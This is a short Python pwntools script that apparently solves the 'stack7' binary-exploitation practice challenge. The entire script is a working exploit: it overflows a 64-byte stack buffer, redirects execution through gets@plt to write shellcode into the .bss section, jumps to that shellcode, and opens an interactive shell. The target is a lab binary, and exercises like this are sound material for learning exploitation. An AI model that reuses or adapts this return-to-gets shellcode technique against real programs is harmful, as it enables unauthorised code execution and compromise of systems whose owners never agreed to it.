#!/usr/bin/env python
# coding: UTF-8

from pwn import *

context(os='linux', arch='i386')
# context.log_level = 'debug' # output verbose log

p = process(['./stack7'])

elf = ELF('./stack7')

buf_size = 64

payload = 'A' * buf_size
payload += 'AAAA' * 4
payload += pack(elf.plt['gets']) + pack(elf.bss()) + pack(elf.bss())

p.sendline(payload)
p.sendline(asm(shellcraft.sh()))

p.interactive()
